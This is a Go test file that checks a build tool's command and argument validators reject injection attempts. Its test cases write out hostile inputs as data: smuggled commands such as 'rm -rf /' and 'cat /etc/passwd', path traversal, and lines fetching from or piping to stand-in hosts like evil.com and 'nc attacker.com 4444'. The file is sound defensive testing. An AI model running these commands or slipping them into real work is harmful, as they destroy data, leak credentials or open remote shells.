package cmd

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

// TestValidateBuildCommand_Security tests the security of build command validation.
func TestValidateBuildCommand_Security(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		args        []string
		expectError bool
		errorType   string
	}{
		{
			name:        "valid templ command",
			command:     "templ",
			args:        []string{"generate"},
			expectError: false,
		},
		{
			name:        "valid go command",
			command:     "go",
			args:        []string{"build", "-o", "main"},
			expectError: false,
		},
		{
			name:        "unauthorized command",
			command:     "bash",
			args:        []string{"-c", "echo hello"},
			expectError: true,
			errorType:   "not allowed",
		},
		{
			name:        "command injection via semicolon",
			command:     "go",
			args:        []string{"build; rm -rf /"},
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name:        "command injection via pipe",
			command:     "go",
			args:        []string{"build | cat /etc/passwd"},
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name:        "command injection via backticks",
			command:     "go",
			args:        []string{"build `whoami`"},
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name:        "command injection via dollar",
			command:     "go",
			args:        []string{"build $(malicious)"},
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name:        "path traversal attempt",
			command:     "go",
			args:        []string{"build", "../../../etc/passwd"},
			expectError: true,
			errorType:   "path traversal",
		},
		{
			name:        "shell redirection attempt",
			command:     "go",
			args:        []string{"build > /etc/passwd"},
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name:        "environment variable injection",
			command:     "go",
			args:        []string{"build", "PATH=/malicious:$PATH"},
			expectError: true,
			errorType:   "dangerous character",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateBuildCommand(tt.command, tt.args)

			if tt.expectError {
				assert.Error(t, err, "Expected error for test case: %s", tt.name)
				assert.Contains(t, strings.ToLower(err.Error()), tt.errorType,
					"Error should contain expected type: %s", tt.errorType)
			} else {
				assert.NoError(t, err, "Expected no error for test case: %s", tt.name)
			}
		})
	}
}

// TestValidateCustomCommand_Security tests the security of custom command validation.
func TestValidateCustomCommand_Security(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		args        []string
		expectError bool
		errorType   string
	}{
		{
			name:        "valid npm command",
			command:     "npm",
			args:        []string{"run", "build"},
			expectError: false,
		},
		{
			name:        "valid make command",
			command:     "make",
			args:        []string{"clean"},
			expectError: false,
		},
		{
			name:        "dangerous command blocked",
			command:     "rm",
			args:        []string{"-rf", "/"},
			expectError: true, // rm is no longer in allowed list
			errorType:   "not allowed",
		},
		{
			name:        "unauthorized command curl",
			command:     "curl",
			args:        []string{"http://malicious.com"},
			expectError: true,
			errorType:   "not allowed",
		},
		{
			name:        "command injection via ampersand",
			command:     "npm",
			args:        []string{"run build & curl http://evil.com"},
			expectError: true,
			errorType:   "not allowed", // npm subcommand validation catches this first
		},
		{
			name:        "script execution attempt",
			command:     "bash",
			args:        []string{"-c", "malicious_script"},
			expectError: true,
			errorType:   "not allowed",
		},
		{
			name:        "python execution attempt",
			command:     "python",
			args:        []string{"-c", "import os; os.system('malicious')"},
			expectError: true,
			errorType:   "not allowed",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateCustomCommand(tt.command, tt.args)

			if tt.expectError {
				assert.Error(t, err, "Expected error for test case: %s", tt.name)
				assert.Contains(t, strings.ToLower(err.Error()), tt.errorType,
					"Error should contain expected type: %s", tt.errorType)
			} else {
				assert.NoError(t, err, "Expected no error for test case: %s", tt.name)
			}
		})
	}
}

// TestValidateArgument_Security tests argument validation security.
func TestValidateArgument_Security(t *testing.T) {
	tests := []struct {
		name        string
		argument    string
		expectError bool
		errorType   string
	}{
		{
			name:        "safe filename",
			argument:    "main.go",
			expectError: false,
		},
		{
			name:        "safe relative path",
			argument:    "src/main.go",
			expectError: false,
		},
		{
			name:        "semicolon injection",
			argument:    "main.go; rm -rf /",
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name:        "pipe injection",
			argument:    "main.go | cat /etc/passwd",
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name:        "backtick injection",
			argument:    "main.go`whoami`",
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name:        "dollar injection",
			argument:    "main.go$(malicious)",
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name:        "path traversal",
			argument:    "../../../etc/passwd",
			expectError: true,
			errorType:   "path traversal",
		},
		{
			name:        "shell redirection",
			argument:    "main.go > /etc/passwd",
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name:        "unsafe absolute path",
			argument:    "/etc/passwd",
			expectError: true,
			errorType:   "absolute path not allowed",
		},
		{
			name:        "allowed tmp path",
			argument:    "/tmp/build",
			expectError: false,
		},
		{
			name:        "allowed usr path",
			argument:    "/usr/bin/make",
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateArgument(tt.argument)

			if tt.expectError {
				assert.Error(t, err, "Expected error for test case: %s", tt.name)
				assert.Contains(t, strings.ToLower(err.Error()), tt.errorType,
					"Error should contain expected type: %s", tt.errorType)
			} else {
				assert.NoError(t, err, "Expected no error for test case: %s", tt.name)
			}
		})
	}
}

// TestSecurityRegression_NoCommandInjection verifies command injection is prevented.
func TestSecurityRegression_NoCommandInjection(t *testing.T) {
	// Test cases based on common command injection patterns
	maliciousCommands := []string{
		"go build; wget http://evil.com/malware",
		"templ generate && curl http://attacker.com",
		"go build || rm -rf /",
		"templ generate | nc attacker.com 4444",
		"go build `wget http://evil.com/script.sh`",
		"templ generate $(curl http://evil.com/cmd)",
		"go build & echo 'pwned' > /tmp/hacked",
		"templ generate > /etc/passwd",
		"go build < /etc/shadow",
	}

	for _, maliciousCmd := range maliciousCommands {
		t.Run("Prevent: "+maliciousCmd, func(t *testing.T) {
			parts := strings.Fields(maliciousCmd)
			if len(parts) < 2 {
				t.Skip("Invalid test case")

				return
			}

			err := validateBuildCommand(parts[0], parts[1:])
			assert.Error(t, err, "Command injection should be prevented: %s", maliciousCmd)
		})
	}
}
